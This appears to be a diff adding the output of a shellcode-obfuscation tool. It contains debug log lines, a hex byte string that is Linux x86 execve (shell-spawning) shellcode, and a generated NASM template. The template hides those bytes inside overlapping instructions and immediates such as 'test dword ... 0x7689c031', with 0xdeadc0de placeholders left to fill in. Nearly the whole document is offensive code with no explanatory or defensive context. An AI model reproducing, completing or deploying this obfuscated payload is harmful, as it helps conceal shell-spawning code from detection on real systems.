@@ -1,0 +1,49 @@
+Checking for best sync conditions
+Done checking sync conditions
+Removing startingBytes with bad sync number
+Size of goodStartingBytes = 20586
+Done removing startingBytes
+maxSyncedAfter = 7
+83 c6 01 31 c0 89 76 08 89 46 0c b8 0b 00 00 00 8d 1e 8d 4e 08 8d 56 0c cd 80 
+Calculating recurring registers and usage of sib bytes
+startingBytes.size() = 7768
+Popping ebp
+PROGRAM!!!
+
+BITS 32
+section .data
+;ALLOCATE DATA HERE
+;Don't forget data for memory access adjustment
+section .text
+	global _start
+_start:
+;preface
+
+;Change 0xdeadc0de to 'label - 1'
+lea esi, [0xdeadc0de]
+
+;Memory adjustment stuff (Change 0xdeadc0de to according memory access adjusment label)
+lea edi, [0xdeadc0de]
+sub edi, 0x1c683ff
+lea ecx, [0xdeadc0de]
+sub ecx, 0xbb80c46
+lea eax, [0xdeadc0de]
+sub eax, 0x0
+push ebp
+lea ebp, [0xdeadc0de]
+sub ebp, 0x84e8d1e
+
+jmp mep0 + 0x3
+
+;mep
+mep0:
+test dword [edi+0x1c683ff], 0x7689c031
+or [ecx+0xbb80c46], cl
+add [eax], al
+add [ebp+0x84e8d1e], cl
+lea edx, [esi+0xc]
+int 0x80
+pop ebp
+mov eax, 1
+mov ebx, 0
+int 0x80
